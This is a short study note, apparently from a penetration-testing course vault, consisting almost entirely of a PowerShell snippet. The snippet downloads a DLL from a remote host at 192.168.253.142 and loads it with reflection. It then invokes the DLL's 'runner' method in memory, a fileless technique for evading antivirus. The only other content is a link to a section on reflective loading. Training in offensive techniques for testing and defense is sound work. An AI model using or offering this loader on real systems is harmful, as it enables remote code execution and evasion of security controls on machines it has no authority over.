```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.253.142:8000/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null) 
```

More Info:
![[Evasion Techniques and Breaching Defenses#4 3 1 Reflective Load]]
